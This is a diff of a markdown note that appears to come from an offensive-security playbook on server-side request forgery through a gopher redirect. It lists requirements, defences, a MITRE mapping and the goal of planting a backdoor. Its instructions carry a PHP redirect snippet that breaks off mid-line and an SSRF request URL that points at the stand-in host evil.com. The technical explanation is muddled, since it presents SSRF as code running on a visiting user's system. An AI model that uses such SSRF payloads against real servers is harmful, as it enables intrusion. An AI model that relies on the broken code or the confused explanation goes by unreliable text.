@@ -37,11 +37,15 @@ Technical Explanation: The attacker sends a crafted request to the target server
 
 Business Value: This technique can be used by attackers to gain access to sensitive resources that are not directly accessible from the internet. By establishing a backdoor into the target environment, the attacker can bypass network restrictions and gain access to valuable data.
 
+ 
+
 ## Requirements
 
 1. Access to a server with a Server-Side Request Forgery vulnerability
 
 1. Ability to send crafted requests to the target server
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ Business Value: This technique can be used by attackers to gain access to sensit
 
 1. Use a web application firewall to detect and block SSRF attacks
 
+ 
+
 ## Objectives
 
 1. Establish a backdoor into the target environment
@@ -59,21 +65,33 @@ Business Value: This technique can be used by attackers to gain access to sensit
 
 1. Access sensitive resources that are not directly accessible from the internet
 
+ 
+
 # Instructions
 
 1. Use this command to redirect a user to a malicious site through the gopher protocol.
+
+ 
+
+
 
 **Code**: [[Content of evil.com/redirect.php:
 <?php
 header("Lo]]
 
+
+
 > This command works by creating a header that redirects the user to a malicious site through the gopher protocol. The gopher protocol is used to access information on the internet and can be used to execute malicious code on a user's system. The user will be redirected to the specified site and may unknowingly execute the malicious code.
+
+
 
 **Command** ([[Query evil.com/redirect.php]]):
 
 ```bash
 https://example.com/?q=http://evil.com/redirect.php
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -97,3 +115,5 @@ https://example.com/?q=http://evil.com/redirect.php
 - [[Gopher SMTP - Back connect to 1337]]
 - [[Server-Side Request Forgery]]
 - [[SSRF exploitation via URL Scheme]]
+
+
